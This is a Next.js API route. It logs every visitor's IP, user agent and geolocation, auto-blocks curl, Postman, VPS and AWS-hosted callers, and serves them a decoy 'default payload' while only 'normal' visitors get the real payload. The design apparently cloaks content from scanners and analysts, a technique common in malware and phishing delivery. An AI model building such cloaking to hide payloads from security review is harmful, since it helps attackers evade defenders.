import { NextResponse } from "next/server";
import {
  logRequest,
  isBlocked,
  blockIp,
  isIspBlocked,
  getPayload,
  getDefaultPayload,
  getForceDefaultMode,
} from "@/lib/store";
import { lookupGeo } from "@/lib/geo";
import { classify, AUTO_BLOCK_TYPES } from "@/lib/detect";

function getClientIp(request) {
  const fwd = request.headers.get("x-forwarded-for");
  if (fwd) return fwd.split(",")[0].trim();
  return request.headers.get("x-real-ip") || "0.0.0.0";
}

async function handle(request) {
  const ip = getClientIp(request);
  const userAgent = request.headers.get("user-agent") || "";

  // 1. Check the IP block list first.
  let blocked = await isBlocked(ip);

  // 2. Classify the request.
  const geo = await lookupGeo(ip);
  const type = classify(userAgent, geo);

  // 3. Check the ISP block list (e.g. "Amazon.com, Inc." for AWS).
  let ispBlocked = false;
  if (!blocked && geo?.isp) {
    ispBlocked = await isIspBlocked(geo.isp);
    if (ispBlocked) blocked = true;
  }

  // 4. curl / VPS / Postman get auto-blocked immediately, on top of
  //    whatever the checks above already found.
  let autoBlocked = false;
  if (!blocked && AUTO_BLOCK_TYPES.includes(type)) {
    await blockIp(ip);
    blocked = true;
    autoBlocked = true;
  }

  // 5. Manual kill switch: force the default response for every caller.
  const forceDefault = await getForceDefaultMode();

  const record = {
    id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    ip,
    userAgent,
    geo,
    type,
    blocked,
    autoBlocked,
    ispBlocked,
    method: request.method,
    path: "/api/v1",
    timestamp: Date.now(),
  };

  // Log every hit regardless of outcome, so the dashboard sees everything.
  await logRequest(record);

  if (blocked || forceDefault || type !== "normal") {
    const defaultPayload = await getDefaultPayload();
    return NextResponse.json(defaultPayload);
  }

  const allowedPayload = await getPayload();
  return NextResponse.json({
    ...allowedPayload,
    timestamp: new Date().toISOString(),
  });
}

export async function GET(request) {
  return handle(request);
}

export async function POST(request) {
  return handle(request);
}
